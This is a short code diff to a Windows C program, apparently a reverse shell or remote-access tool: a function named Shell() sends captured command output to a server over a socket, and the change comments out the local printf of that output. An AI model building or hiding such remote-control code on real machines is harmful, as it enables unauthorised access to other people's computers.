@@ -1,7 +1,6 @@
 #include "status.h"
 #include "logger.h"
 #include "str_cut.h"
-
 #include <winsock2.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -125,7 +124,7 @@ void Shell()
       }
 
       // Send the response to the server
-      printf("%s", total_response);
+      // printf("%s", total_response); DEBUGGING PURPOSES
       send(sock, total_response, sizeof(total_response), 0);
 
       // Close fp
